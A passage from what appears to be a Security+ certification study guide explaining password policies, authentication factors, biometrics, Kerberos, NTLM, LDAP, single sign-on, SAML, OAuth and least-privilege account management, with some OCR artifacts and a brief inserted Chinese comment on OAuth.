Check out the online lab Using John the Ripper available at http:// gcgapremium.com/501labs/. It shows how easy it can be to crack weak passwords.
Password Expiration
In addition to using strong passwords, users should change their passwords regularly, such as every 45 or 90 days. In most systems, technical password policies require users to change their passwords regularly. When the password expires, users are no longer able to log on unless they first change their password.
I can tell you from experience that if users are not forced to change their passwords through technical means, they often simply don’t. It doesn’t matter how many reminders you give them. On the other hand, when a password policy locks out user accounts until they change their password, they will change it right away.
Password Recovery
It’s not uncommon for users to occasionally forget their password. In
 many organizations, help-desk professionals or other administrators reset user passwords.
Before resetting the password, it’s important to verify the user’s identity. Imagine that Hacker Harry calls into the help desk claiming to be the CEO and asks for his password to be reset. If the help- desk professional does so, it locks the CEO out of the account. Worse, depending on the process, it might give Hacker Harry access to the CEO’s account. Organizations use a variety of different methods of identification before resetting a user’s account to prevent these vulnerabilities.
In some systems, help-desk professionals manually change the user’s password. This causes a different problem. Imagine a user calls the help desk and asks for a password reset. The help- desk professional changes the password and lets the user know the new password. However, at this point, two people know the password. The help-desk professional could use the password and impersonate the user, or the user could blame the help-desk professional for impersonating the user.
Instead, the help-desk professional should set the password as a temporary password that expires upon first use. This requires the user to change the password immediately after logging on and it maintains password integrity.
Instead of an IT professional spending valuable time resetting passwords, a self-service password reset or password recovery system automates the process. example, many online systems include a link, such as “Forgot Password.” If you click on this link, the system might send you your password via email, or reset your password and send the new password via email.
Some systems invoke an identity-proofing system. The identity- proofing system asks you questions that you previously answered, such as the name of your first dog, the name of your first boss, and so on. Once you adequately prove your identity, the system gives you the opportunity to change your password.
 Many password reset systems send you a code, such as a six-digit PIN, to your mobile phone or to an alternate email address that you’ve preconfigured. When you receive this PIN, you can enter it and then change your password.
Password History and Password Reuse
Many users would prefer to use the same password forever simply because it’s easier to remember. Even when technical password policies force users to change their passwords, many users simply change them back to the original password. Unfortunately, this significantly weakens password security.
A password history system remembers past passwords and prevents users from reusing passwords. It’s common for password policy settings to remember the last 24 passwords and prevent users from reusing these until they’ve used 24 new passwords.
Group Policy
Windows domains use Group Policy to manage multiple users and computers in a domain. Group Policy allows an administrator to configure a setting once in a Group Policy Object (GPO) and apply this setting to many users and computers within the domain. Active Directory Domain Services (AD DS) is a directory service Microsoft developed for Windows domain networks. It is included in most Windows Server operating systems as a set of processes and services. Administrators implement domain Group Policy on domain controllers.
Although you can implement Group Policy on single, stand-alone Windows computers, the great strength of Group Policy comes when you implement it in a Microsoft domain. example, if you want to change the local Administrator password on all the computers in your domain, you can configure a GPO once, link the GPO to the domain, and it changes the local Administrator password for all the computers in the domain. The magic of Group Policy is that it doesn’t matter if you have five systems or five thousand systems. The policy still only needs to be set once to apply to all systems in the domain.
Administrators also use Group Policy to target specific groups of users or computers. example, in a Microsoft domain, administrators organize user accounts and computer accounts  in organizational units (OUs). They can then create a GPO, link it to a specific
OU, and the GPO settings only apply to the users and computers within the OU. These settings do not apply to users and computers in other OUs.
Using a Password Policy
A common group of settings that administrators configure in Group Policy is the Password Policy settings. Password policies typically start as a written document that identifies the organization’s security goals related to passwords. example, it might specify that passwords must be at least 14 characters long, complex, and users should change them every 45 days. Administrators then implement these requirements with a technical control such as a technical Password Policy within a GPO.
Figure 2.1 shows the Local Group Policy Editor with the Password Policy selected in the left pane. The right pane shows the password policy for a Windows system and the following text explains these settings:
 Figure 2.1: Password Policy in Windows
Enforce password history. Some users will go back and forth between two passwords that they constantly use and reuse. However, password history remembers past passwords and prevents the user from reusing previously used passwords. example, setting thisto
24 prevents users from reusing passwords until they’ve used 24 new passwords.
Maximum password age. This setting defines when users must change their password. example, setting this to 45 days causes the password to expire after 45 days. This forces users to reset their password to a new password on the 46th day.
Minimum password age. The minimum password age defines how long users must wait before changing their password again. If you set this to 1 day, it prevents users from
changing their passwords until 1 day has passed. This is useful with a password history to prevent users from changing their password multiple times until they get back to the original password. If the password history is set to 24 and the minimum password age is set to 1 day, it will take a user 25 days to get back to the original password. This is enough to discourage most users.
Minimum password length. This setting enforces the character length of the password. I t ’s common to require users to have passwords at least 14 characters long, but some organizations require administrators to have longer passwords.
Password must meet complexity requirements. This setting requires users to have complex passwords that include at least three of the four character types (uppercase letters, lowercase letters, numbers, and special characters).
Store passwords using reversible encryption. Reversible encryption stores the password in such a way that the original password can be discovered. This is rarely enabled.  Implementing Account Lockout Policies
Accounts will typically have lockout policies preventing users from guessing the password. If a user enters the wrong password too many times (such as three or five times), the system locks the user’s account. Figure 2.1 shows the Password Policy settings. The Account Lockout Policy is right below it and allows administrators to use Group Policy to implement a lockout policy.
Two key phrases associated with account lockout policies are:
Account lockout threshold. This is the maximum number of times a user can enter the wrong password. When the user exceeds the
threshold, the system locks the account.
Account lockout duration. This indicates how long an account remains locked. It could be set to 30, indicating that the system will lock the account for 30 minutes. After 30 minutes, the system automatically unlocks the account. If the duration is set to 0, the account remains locked until an administrator unlocks it.
Changing Default Passwords
Many systems and devices start with default passwords. A basic security practice is to change these defaults before putting a system into use. example, many wireless routers have default accounts named “admin” or “administrator” with a default password of “admin.” If you don’t change the password, anyone who knows the defaults can log on and take control of the router. In that case, the attacker can even go as far as locking you out of your own network.
Changing defaults also includes changing the default name of the Administrator account, if possible. In many systems, the Administrator account can’t be locked out through regular lockout policies, so an attacker can continue to try to guess the password of the Administrator account without risking being locked out. Changing the name of the Administrator account to something else, such as Not4U2Know, reduces the chances of success for the attacker. The attacker needs to know the new administrator name before he can try to guess the password.
Some administrators go a step further and add a dummy user account named “administrator.” This account has no permissions. If someone does try to guess the password of this account, the system will lock it out, alerting administrators of possible illicit activity.
Something You Have
The something you have authentication factor refers to something you can physically hold. This section covers many of the common items in this factor, including smart cards, Common Access Cards, and hardware tokens. It also covers two open source protocols used with both hardware and software tokens.
Smart Cards
Smart cards are credit card-sized cards that have an embedded microchip and a certificate. Users insert the smart card into a smart card reader, similar to how someone would insert a credit card into a credit card reader. The smart card reader reads the information on the card, including the details from the certificate, which provides certificate-based authentication.
Chapter 10, “Understanding Cryptography and PKI,” covers certificates in more detail, but as an introduction, they are digital files that support cryptography for increased security. The embedded certificate allows the use of a complex encryption key and provides much more secure authentication than is possible with a simple password. Additionally, the certificate can be used with digital signatures and data encryption. The smart card provides
confidentiality, integrity, authentication, and non-repudiation.
 Requirements for a smart card are:
Embedded certificate. The embedded certificate holds a user’s private key (which is only accessible to the user) and is matched with a public key (that is publicly available to others). The private key is used each time the user logs on to a network.
Public Key Infrastructure (PKI). Chapter 10 covers PKI in more depth, but in short, the PKI supports issuing and managing certificates. Smart cards are often used with another factor of authentication. example, a user may also enter a PIN or password, in addition to using the smart card. Because the smart card is in the something you have factor and the PIN is in the something you know factor, this combination provides dual- factor
authentication.
CACs and PIVs ACommonAccessCard(CAC)isaspecializedtypeofsmartcardusedby the
U.S. Department
of Defense. In addition to including the capabilities of a smart card, it also includes a picture of the user and other readable information. Users can use the CAC as a form of photo identification to gain access into a secure location. example, they can show their CAC to guards who are protecting access to secure areas. Once inside the secure area, users can use the CAC as a smart card to log on to computers.
Similarly, a Personal Identity Verification (PIV) card is a specialized type of
smart card used by
U.S. federal agencies. It also includes photo identification and provides confidentiality, integrity, authentication, and non-repudiation for the users, just as a CAC does.
 CACs and PIVs both support dual-factor authentication (sometimes called two-factor authentication) because users generally log on with the smart card and by entering information they know such as a password. Additionally, just as with smart cards, these cards include embedded certificates used for digital signatures and encryption.
Tokens or Key Fobs
A token or key fob (sometimes simply called a fob) is an electronic device about the size of a remote key for a car. You can easily carry them in a pocket or purse, or connect them to a key chain. They include a liquid crystal
display (LCD) that displays a number, and this number changes periodically, such as every 60 seconds. They are sometimes called hardware tokens to differentiate them from logical, or software tokens.
The token is synced with a server that knows what the number is at any moment. example, at 9:01, the number displayed on the token may be 135792 and the server knows the number is 135792. At 9:02, the displayed
number changes to something else and the server also knows the new number. This number is a one-time use, rolling password. It isn’t useful to attackers for very long, even if they can discover it. example, a shoulder surfing attacker might be able to look over someone’s shoulder and read the number. However, the number expires within the next 60 seconds and is replaced by
another one-time password.
Users often use tokens to authenticate via a web site. They enter the
number displayed in the token along with their username and password. This provides dual-factor authentication because the users must have something (the token) and know something (their password).
RSA sells RSA Secure ID, a popular token used for authentication. You can Google “Secure ID image” to view many pictures of these tokens. Although RSA tokens are popular, other brands are available. HOTP and TOTP
Hash-based Message Authentication Code (HMAC) uses a hash function and cryptographic key for many different cryptographic functions
Hash: a number created with a hashing algorithm. HMAC-based One-Time Password (HOTP)
- an open standard used for creating one-time passwords, similar to those used in tokens or key fobs.
- The algorithm combines a secret key and an incrementing counter, and uses HMAC to create a hash of the result.
- It then converts the result into an HOTP value of six to eight digits.
Imagine Bart needs to use HOTP for authentication. He requests a new HOTP number using a token or a software application. He can then use this number for authentication along with some other authentication method, such as a username and password. As soon as he uses it, the number expires. No one else is able to use it, and Bart cannot use it again either.
Here’s an interesting twist, though. A password created with HOTP remains valid until it’s used. Suppose Bart requested the HOTP number but then got distracted and never used it. What happens now? Theoretically, it remains usable forever. This presents a risk related to HOTP because other people can use the password if they discover it.
A Time-based One-Time Password (TOTP) is similar to HOTP, but it uses a timestamp instead of a counter. One-time passwords created with TOTP typically expire after 30 seconds.
One significant benefit of HOTP and TOTP is price. Hardware tokens that use these open source standards are significantly less expensive than tokens that use proprietary algorithms. Additionally, many software applications use these algorithms to create software tokens used within the application.
example, Figure 2.2 shows the free VIP Access app created by Symantec and running on an iPad. It’s also available for many other tablets and smartphones. Once you configure it to work with a compatible authentication server, it creates a steady stream of one-time use passwords. The six-digit security code is the password, and the counter lets you know how much more time you have before it changes again.
 Figure 2.2: VIP Access app
Similar to a hardware token, the user enters a username and password as the something you know factor, and then enters the security code from the app as the something you have factor. This provides dual-factor authentication. Many public web sites like eBay and PayPal support it, allowing many end users to implement dual-factor authentication as long as they have a smartphone or tablet device.
 Something You Are
The something you are authentication factor uses biometrics for authentication. Biometric methods are the strongest form of authentication because they are the most difficult for an attacker to falsify. In comparison, passwords are the weakest form of authentication.
Biometric Methods
Biometrics use a physical characteristic, such as a fingerprint, for authentication. Biometric systems use a two-step process. In the first step, users register with the authentication system. example, an authentication system first captures a user’s fingerprint and associates it with the user’s identity. Later, when users want to access the system, they use their fingerprints to prove their identity. There are multiple types of biometrics, including:
Fingerprint scanner. Many laptop computers include fingerprint scanners or fingerprint readers, and they are also common on tablet devices and smartphones. Similarly, some USB flash drives include a fingerprint scanner. They can store multiple fingerprints of three or four people to share access to the same USB drive. Law enforcement agencies have used fingerprints for decades, but they use them for identification, not biometricauthentication.
Retina scanner. Retina scanners scan the retina of one or both eyes and use the pattern of blood vessels at the back of the eye for recognition. Some people object to the use of these scanners for authentication because they can identify medical issues, and because you typically need to have physical contact with the scanner.
Iris scanner. Iris scanners use camera technologies to capture the patterns of the iris around the pupil for recognition. They are used in many passport-free border crossings around the world. They can take pictures from about 3 to 10 inches away, avoiding physical contact.
Voice recognition. Voice recognition methods identify who is speaking using speech recognition methods to identify different acoustic features. One person’s voice varies from another person’s voice due to differences in their mouth and throat, and behavioral
patterns that affect their speaking style. example, Apple’s Siri supports voice recognition. After setting it up, Siri will only respond to the owner’s voice. Unfortunately, that does prevent the old party trick of yelling out “Hey Siri” at a party where multiple people have iPhones. Facial recognition. Facial recognition systems identify people based on facial features. This includes the size of their face compared with the rest of their body, and the size, shape, and position of their eyes, nose, mouth, cheekbones, and jaw. A drawback with this is that it is sometimes negatively affected by changes in lighting. Microsoft Windows systems support Windows Hello facial recognition services. To avoid the challenges from normal lighting, it uses infrared (IR) and can operate in diverse lighting conditions.
Biometric Errors
Biometrics can be very exact when the technology is implemented accurately. However, it is possible for a biometric manufacturer to take shortcuts and not implement it correctly, resulting in false readings. Two biometric false readings are:
False acceptance. This is when a biometric system incorrectly identifies an unauthorized user as an authorized user. The false acceptance rate (FAR, also known as a false match rate) identifies the percentage of times false acceptance occurs.
False rejection. This is when a biometric system incorrectly rejects an authorized user. The false rejection rate (FRR, also known as a false nonmatch rate) identifies the percentage of times false rejections occur.
True readings occur when the biometric system accurately accepts or rejects a user. example, true acceptance is when the biometric system accurately determines a positive match. In contrast, true rejection occurs when the biometric system accurately determines a nonmatch. Biometric systems allow you to adjust the sensitivity or threshold level where errors occur. By increasing the sensitivity, it decreases the number of false matches and increases the number of false rejections. In contrast, decreasing the sensitivity increases the false matches and decreases the false rejections. By plotting the FAR and FRR rates using different sensitivities, you  can determine the effectiveness of a biometric system. Figure 2.3 shows the crossover error rate (CER) for two biometric systems. The CER is the
point where the FAR crosses over with the FRR. A lower CER indicates
that the biometric system is more accurate. F o r example, the system represented with the solid lines in the figure is more accurate than the system represented by the dotted lines. Figure 2.3: Crossover error rate Somewhere You Are
The somewhere you are authentication factor identifies a user’s location. Geolocation is a group of technologies used to identify a user’s location and is the most common methodused
 in this factor. Many authentication systems use the Internet Protocol (IP) address for geolocation. The IP address provides information on the country, region, state, city, and sometimes even the zip code.
example, I once hired a virtual assistant in India to do some data entry for me. I created an account for the assistant in an online application called Hootsuite and sent him the logon information. However, when he attempted to log on, Hootsuite recognized that his IP was in India but I always logged on from an IP in the United States. Hootsuite blocked his access and then sent me an email saying that someone from India was trying to log on. They also provided me directions on how to grant him access if he was a legitimate user, but it was comforting to know they detected and blocked this access automatically.
I t ’s worth noting that using an IP address for geolocation isn’t foolproof. There are many virtual private network (VPN) IP address changers available online. example, a user in Russia can use one of these services in the United States to access a web site. The web site will recognize the IP address of the VPN service, but won’t see the IP address of the user in Russia.
Within an organization, it’s possible to use the computer name or the media access control (MAC) address of a system for the somewhere you are factor. example, in a Microsoft Active Directory domain, you can configure accounts so that users can only log on to the network through one specific computer. If they aren’t at that computer, the system blocks them from logging on at all.
Something You Do
The something you do authentication factor refers to actions you can take
such as gestures on a touch screen. example, Microsoft Windows 10 supports picture passwords. Users first select a picture, and then they can add three gestures as their picture password. Gestures include tapping in specific places on the picture, drawing lines between items with a finger, or drawing a circle around an item such as someone’s head. After registering the picture and their gestures, users repeat these gestures to log on again later.
Other examples of something you do include how you write or how you type. example, keystroke dynamics measure the pattern and rhythm as a user types on a keyboard. It measures details such as speed, dwell time, and flight time. Dwell time is the time a key is pressed, and flight time is the time between releasing one key and pressing the next key. Many security professionals refer to this as behavioral biometrics because it identifies behavioral traits of an individual. However, some people put these actions into the something you do authentication factor.
Dual-Factor and Multifactor Authentication
Dual-factor authentication (sometimes called two-factor authentication) uses two different factors of authentication, such as something you have and something you know. Dual-factor authentication often uses a smart card and a PIN, a USB token and a PIN, or combines a smart card or hardware token with a password. In each of these cases, the user must have something and know something.
Multifactor authentication uses two or more factors of authentication. example, you can combine the something you are factor with one or more other factors of authentication.
Note that technically you can call an authentication system using two different factors either dual-factor authentication or multifactor authentication. Multifactor authentication indicates multiple factors and multiple is simply more than one.
It’s worth noting that using two methods of authentication in the same factor is not dual- factor authentication. example, requiring users to enter a password and a PIN (both in the something you know factor) is single- factor authentication, not dual-factor authentication. Similarly, using a thumbprint and a retina scan is not dual-factor authentication because both methods are in the something you are factor.
Summarizing Identification Methods
So far, this chapter has presented several different identification methods and because identification is so important, it’s worthwhile to summarize them. They are usernames, photo identification cards, and biometrics.
The most commonly used identification method is a username. This can be a traditional username, such as DarrilGibson, or it can be an email address, such as Darril@gcgapremium.com, depending on how the system is
configured. Many other identification methods can be used for both identification and authentication.
CACs and PIVs include a picture and other information about the owner, so owners often use them for identification. They also function as smart cards in the something you have authentication factor.
The “Something You Are” section focused on using biometrics for authentication, but several entities also use biometric methods for identification. example, law enforcement agencies have used fingerprints to identify individuals at crime scenes for decades. Similarly, retina and palm scanners can identify individuals with a high degree of accuracy.
Troubleshooting Authentication Issues
Some common authentication issues that can cause security problems have been mentioned in this section. As a summary, they are:
   Weak passwords. If users aren’t forced to use strong, complex passwords, they probably won’t and their accounts will be vulnerable to attacks. A technical password policy ensures users implement strong passwords, don’t reuse them, and change them regularly.
Forgotten passwords. An organization needs to have a password recovery procedure in place to help users recover their passwords. If passwords are manually reset without verifying the identity of the user, i t ’s possible for an attacker to trick someone into resetting the password. Biometric errors. Weak biometric systems with a high crossover error rate may have a high false match rate (also called a false acceptance rate) or a low nonmatch rate (also called a false rejection rate).
Comparing AuthenticationServices
Severalotherauthenticationservicesareavailablethatfalloutsidethescopeofthe described factors of authentication. A common goal they have is to ensure that unencrypted credentials are not sent across a network. In other words, they ensure that credentials are not sent in cleartext. If credentials are sent in cleartext, attackers can use tools such as a protocol analyzer to capture and view them. The following sections describe many of these services.
Kerberos
Kerberos is a network authentication mechanism used within Windows Active Directory domains and some Unix environments known as realms. It was originally developed at MIT (the Massachusetts Institute of Technology) for Unix systems and later released as a request for comments (RFC). Kerberos provides mutual authentication that can help prevent man- in-the- middle attacks and uses tickets to help prevent replay attacks. Chapter 7, “Protecting Against Advanced Attacks,” covers these attacks in more depth.
Kerberos includes several requirements for it to work properly. They are:
A method of issuing tickets used for authentication. The Key Distribution Center (KDC) uses a complex process of issuing ticket-
granting tickets (TGTs) and other tickets. The KDC (or TGT server) packages user credentials within a ticket. Tickets provide authentication for users when they access resources such as files on a file server. These tickets are sometimes referred to as tokens, but they are logical tokens, not a key fob type of token discussed earlier in the “Something You Have” section.
Time synchronization. Kerberos version 5 requires all systems to be synchronized and within five minutes of each other. The clock that provides the time synchronization is used to timestamp tickets, ensuring they expire correctly. This helps prevent replay attacks. In a replay attack, a third party attempts to impersonate a client after intercepting data captured in a session. However, if an attacker intercepts a ticket, the timestamp limits the amount of time an attacker can use the ticket.
A database of subjects or users. In a Microsoft environment, this is
Active Directory, but it could be any database of users.
When a user logs on with Kerberos, the KDC issues the user a ticket- granting ticket, which typically has a lifetime of 10 hours to be useful for a single workday. When the user tries to access a resource, the ticket-granting ticket is presented as authentication, and the user is issued a ticket for the resource. However, the ticket expires if users stay logged on for an extended
period, such
as longer than 10 hours. This prevents them from accessing network resources. In this case, users may be prompted to provide a password to renew the ticket- granting ticket, or they might need to log off and back on to generate a new ticket-granting ticket.
 NTLM
New Technology LAN Manager (NTLM) is a suite of protocols that provide authentication, integrity, and confidentiality within Windows systems. At their most basic, they use a Message Digest hashing algorithm to challenge users and check their credentials. There are three versions of NTLM:
NTLM is a simple MD4 hash of a user’s password. MD4 has been cracked and neither NTLM nor MD4 are recommended for use today. NTLMv2 is a challenge-response authentication protocol. When a user attempts to log on, NTMLv2 creates an HMAC-MD5 hash composed of a combination of the username, the logon domain name (or computer name), the user’s password, the current time, and more. To create an HMAC-MD5 message, authentication code starts as the MD5 hash of a user’s password, which is then encrypted.
NTLM2 Session improves NTLMv2 by adding in mutual authentication. In other words, the client authenticates with the server, and the server also authenticates with the client. So, which protocol should you select? Actually, Microsoft specifically recommends that developers don’t select one of these protocols. Instead, developers should use the Negotiate security package within their applications. This security package selects the most secure security protocols available between the systems. It first tries to use Kerberos if it is available.
If not, it uses either NTLMv2 or NLTM2 Session depending on the capabilities of the systems involved in the session.
LDAP and LDAPS
Lightweight Directory Access Protocol (LDAP) specifies formats and methods to query directories. In this context, a directory is a database of objects that provides a central access point to manage users, computers, and other directory objects. LDAP is an extension of the X.500 standard that Novell and early Microsoft Exchange Server versions used extensively.
Windows domains use Active Directory, which is based on LDAP. Active Directory is a directory of objects (such as users, computers, and groups), and it provides a single location for object management. Queries to Active Directory use the LDAP format. Similarly, Unix realms use LDAP to identify objects.
Administrators often use LDAP in scripts, but they need to have a basic understanding of how to identify objects. example, a user named Homer in the Users container within the GetCertifiedGetAhead.com domain is identified
with the following LDAP string: LDAP://CN=Homer,CN=Users,DC=GetCertifiedGetAhead,DC=com CN=Homer. CN is short for common name.
CN=Users. CN is sometimes referred to as container in this context. DC=GetCertifiedGetAhead. DC is short for domain component. DC=com. This is the second domain component in the domain name.
LDAP Secure (LDAPS) uses encryption to protect LDAP transmissions. When a client connects with a server using LDAPS , the two systems establish a Transport Layer Security (TLS) session before transmitting any data. TLS encrypts the data before transmission.
Single Sign-On
Single sign-on (SSO) refers to the ability of a user to log on or access multiple systems by providing credentials only once. SSO increases security because the user only needs to remember one set of credentials and is less likely to write them down. It’s also much more convenient for users to access network resources if they only have to log on onetime.
example, consider a user who needs to access multiple servers within a network to perform normal work. Without SSO, the user would need to know one set of credentials to log on locally, and additional credentials for each of the servers. Many users would write these credentials down to remember them.
Alternatively, in a network with SSO capabilities, the user only needs to log on to the network once. The SSO system typically creates some type of SSO secure token used during the entire logon session. Each time the user accesses a network resource, the SSO system uses this secure token for authentication. Kerberos and LDAP both include SSO capabilities.
  SSO requires strong authentication to be effective. If users create weak passwords, attackers might be able to guess them, giving them access to multiple systems. Some people debate that SSO adds in risks because if an attacker can gain the
user’s credentials, it gives the attacker access to multiple systems.
SSO and Transitive Trusts
transitive trust:
- creates an indirect trust relationship. example, imagine a transitive trust relationship exists between Homer, Moe, and Fat Tony:
  - Homer trusts Moe.
  - Moe trusts Fat Tony.
  - Because of the transitive trust relationship, Homer trusts Fat Tony.
- Of course, this isn’t always true with people and Homer might be a little upset with Moe if Moe shares Homer’s secrets with Fat Tony. However, it reduces network administration in a domain.  - Within an LDAP-based network, domains use transitive trusts for SSO. Figure 2.4 shows a common configuration with three domains in the same network. T
- he parent domain is GetCertifiedGetAhead.com and the configuration includes two child domains—Training and Blogs.
Figure 2.4: An LDAP transitive trust used for SSO
In this example, there is a two-way trust between the parent domain (GetCertifiedGetAhead.com) and the child domain (Training.GetCertifiedGetAhead.com). The parent trusts the child, and the child trusts the parent. Similarly, there is a two-way trust between the parent domain and the Blogs child domain. There isn’t a direct trust between the two child domains. However, the transitive relationship creates a two-way trust between them. All of these domains contain objects, such as users, computers, and groups. Homer’s user account is in the Training domain, and a server named Costington is in the Blogs domain. With the transitive trust, it’s possible to grant Homer access to the Costington server without creating another trust relationship directly between the Training and Blogs domains.
Without a trust relationship, you’d have to create another account for Homer in the Blogs domain before you could grant him access. Additionally, Homer would need to manage the second account’s password separately. However, with the transitive trust relationships, the network supports SSO, so Homer only needs a single account.
SSO and SAML
Security Assertion Markup Language (SAML) is an Extensible Markup Language (XML)– based data format used for SSO on web browsers. Imagine two web sites hosted by two different organizations. Normally, a user would have to provide different credentials to access either web site. However, if the organizations trust each other, they can use SAML as a federated identity management system. Users authenticate with one web site and are not required to authenticate again when accessing the second web site.
Many web-based portals use SAML for SSO. The user logs on to the portal once, and the portal then passes proof of the user’s authentication to back-end systems. As long as one organization has authenticated users, they are not required to authenticate again to access other sites within the portal.
SAML defines three roles:
Principal. This is typically a user. The user logs on once. If necessary, the principal requests an identity from the identity provider.
Identity provider. An identity provider creates, maintains, and manages identity information for principals.
Service provider. A service provider is an entity that provides services to principals. example, a service provider could host one or more web sites accessible through a web- based portal. When a principal tries to access a resource, the service provider redirects the principal to obtain an identity first.
This process sends several XML-based messages between the systems. However, it is usually transparent to the user. SAML and Authorization
I t ’s important to realize that the primary purpose of SSO is for identification and authentication of users. Users claim an identity and prove that identity with credentials. SSO does not provide authorization. example, if the power plant and the school system create a federation using SAML, this doesn’t automatically grant everyone in the school system full access to the nuclear power plant resources. Authorization is completely separate.
However, many federation SSO systems, including SAML, include the ability to transfer authorization data between their systems. In other words, it’s possible to use SAML for single sign-on authentication and for authorization.
SSO and a Federation
Some SSO systems can connect authentication mechanisms from different environments, such as different operating systems or different networks. One common method is with a federated identity management system, often integrated as a federated database. This federated database provides central authentication in a nonhomogeneous environment.
example, imagine that the Springfield Nuclear Power Plant established a relationship
with the Springfield school system, allowing the power plant employees to access school resources. I t ’s not feasible or desirable to join these two networks into one. However, you can create a federation of the two networks. Once i t’s established, the power plant employees will log on using their power plant account, and then access the shared school resources without logging on again.
A federation requires a federated identity management system that all members of the federation use. In the previous example, the members of the federation are the power plant and the school system. Members of the federation agree on a standard for federated identities and then exchange the information based on the standard. A federated identity links a user’s
 credentials from different networks or operating systems, but the federation treats it as one identity.
Shibboleth is one of the federated identity solutions mentioned specifically in the CompTIA Security+ exam objectives. It is open source and freely available, making it a more affordable solution than some of the commercially available federated identity solutions. It also includes Open SAML libraries written in C++ and Java, making it easier for developers to expand its usefulness.
OAuth, OpenID
OAuth
- an open standard for authorization many companies use to provide secure access to protected resources.
- Instead of creating a different account for each web site you access, you can often use the same account that you’ve created with Google, Facebook, PayPal, Microsoft, or Twitter.
- Example
  - Try-N-Save Department Store sell products online
  - allow customers to make purchases through PayPal.
  - Developers configure their web site to exchange application programming interface (API) calls between it and PayPal servers.
  - Now, when customers make a purchase, they log on with their PayPal account and make their purchase through PayPal.
  - OAuth transfers data between PayPal and the Try-N-Save site so that the department store receives the money and knows what to ship to the customer.
  - A benefit for the customers is that they don’t have to create another account for Try-N-Save.
- OAuth让授权网站可以在不获知你的密码的情况下拥有你对该网站的使用权限。这 种授权原应是你对信任的网站授予你某个网站(如微博，人人)的使用权限。但 现在被广泛的用于免去注册环节直接登录的方法。换言之，网站借大部分用户对 OAuth概念的不清楚，“骗取”了你的所有权限。至于这个先例，应该是Facebook connect开的吧。 OpenID Connect
- works with OAuth 2.0
- allows clients to verify the identity of end users without managing their credentials.
- In this context, the client is typically a web site or application that needs to authenticate users.
- OpenID Connect provides identification services, without requiring the application to handle the credentials.
- It also streamlines the user experience for users.
- Example:
- Skyscanner
  - allows users to sign in using their Facebook credentials.
  - After doing so, Skyscanner provides a more personalized experience
for the users.
Managing Accounts
Account management is concerned with the creation, management, disablement, and termination of accounts. When the account is active, access control methods are used to control what the user can do. Additionally, administrators use access controls to control when and where users can log on. The following sections cover common account management practices, along with some basic principles used with account management. Improperly configured accounts don’t follow these principles, increasing risks.
Least Privilege
The principle of least privilege is an example of a technical control implemented with access controls. Privileges are the rights and permissions assigned to authorized users. Least privilege specifies that individuals and processes are granted only the rights and permissions needed to perform assigned tasks or functions, but no more. example, if Lisa needs read access to a folder on a server, you should grant her read access to that folder, but nothing else.
A primary goal of implementing least privilege is to reduce risks. example,
imagine that Carl works at the Nuclear Power Plant, but administrators have improperly configured accounts ignoring the principle of least privilege. In other words, Carl has access to all available data within the Nuclear Power Plant, not just the limited amount of data he needs to perform his job. Later, Lenny gets into trouble and needs money, so he convinces Carl to steal data from the power plant so that they can sell it. In this scenario, Carl can steal and sell all the data at the plant, which can result in serious losses.
In contrast, if administrators applied the principle of least privilege, Carl would only have access to a limited amount of data. Even if Lenny convinces him to steal the data, Carl wouldn’t be able to steal very much simply because he doesn’t have access to it. This limits the potential losses for the power plant.
This principle applies to regular users and administrators. example, if Marge administers all the computers in a training lab, it’s appropriate to give her administrative control over all these computers. However, her privileges don’t need to extend to the domain, so she wouldn’t have administrative control over all the computers in a network. Additionally, she wouldn’t have the privileges required to add these computers to the domain, unless that was a requirement in the training lab. Similarly, if a network administrator needs to review logs and update specific network devices, it’s appropriate to give the administrator access to these logs and devices, but no more.
Many services and applications run under the context of a user account. These services have the privileges of this user account, so it’s important to
ensure that these accounts are only granted the privileges needed by the service or the application. In the past, many administrators configured these service and application accounts with full administrative privileges. When attackers compromised a service or application configured this way, they gained administrative privileges and wreaked havoc on the network.
Need to Know The principle of need to know is similar to the principle of least privilege in that users are granted access only to the data and information that they need to know for their job. Notice that need to know is focused on data and information, which is typically protected with permissions. In contrast, the principle of least privilege includes both rights and permissions.
Rights refer to actions and include actions such as the right to change the system time, the right to install an application, or the right to join a computer to a domain. Permissions typically refer to permissions on files, such as read, write, modify, read & execute, and full control.
Account Types
When managing accounts, it’s important to recognize the common types of accounts used within a network. They are:
End user accounts. Most accounts are for regular users. Administrators create these accounts and then assign appropriate privileges based on the user’s job responsibilities. Microsoft refers to this as a Standard user account.
Privileged accounts. A privileged account has additional rights and privileges beyond what a regular user has. example, someone with administrator privileges on a Windows computer has full and complete control over the Windowscomputer.
Guest accounts. Windows operating systems include a Guest account. These are useful if you want to grant someone limited access to a computer or network without creating a new account. example, imagine an organization contracts with a temp agency to have someone do data entry. It’s possible that the agency sends a different person every day. Enabling the Guest account for this person would be simpler than creating a new account every day. Administrators commonly disable the Guest account and only enable it in special situations.
Service accounts. Some applications and services need to run under the context of an account and a service account fills this need. example, SQL Server is a database application that runs on a server and it needs access to resources on the server and the network. Administrators create a regular user account, name it something like sqlservice, assign it appropriate privileges, and configure SQL Server to use this account. Note that this is like a regular end-user account. The only difference is
that it’s only used by the service or application, not an end user.
One of the challenges with service accounts is that they often aren’t managed. example, imagine a regular user account that has a password that expires after 45 days. The user is notified to change the password and the user does so. A service account might send a notification to the application to change
the password, but the notification is ignored. When the password
expires, the account is locked. Suddenly, the application (or service) stops working and administrators have to troubleshoot the issue to figure out why.
A solution is to configure the service account so that it doesn’t have to comply with the password policy. However, this allows the service account to ignore other policy requirements such as using a strong, complex password. It’s important that developers using these types of accounts take steps to ensure their accounts follow existing policies.
Require Administrators to Use Two Accounts
It’s common to require administrators to have two accounts. They use one account for regular day-to-day work. It has the same limited privileges as a regular end user. The other account has elevated privileges required to perform administrative work, and they use this only when performing administrative work. The benefit of this practice is that it reduces the exposure of the administrative account to an attack.
example, when malware infects a system, it often attempts to gain additional rights and permissions using privilege escalation techniques. It may exploit a bug or flaw in an application or operating system. Or, it may simply assume the rights and permissions of the logged-on user. If an administrator logs on with an administrative account, the malware can assume these elevated privileges. In contrast, if the administrator is logged on with a regular standard user
account, the malware must take additional steps to escalate its privileges.
This also reduces the risk to the administrative account for day-to-day work. Imagine Homer is an administrator and he’s called away to a crisis. It is very possible for him to walk away without locking his computer. If he was logged on with his administrator account, an attacker walking by can access the system and have administrative privileges. Although systems often have password-protected screen savers, these usually don’t start until about 10 minutes or longer after a user walksaway.
Standard Naming Convention
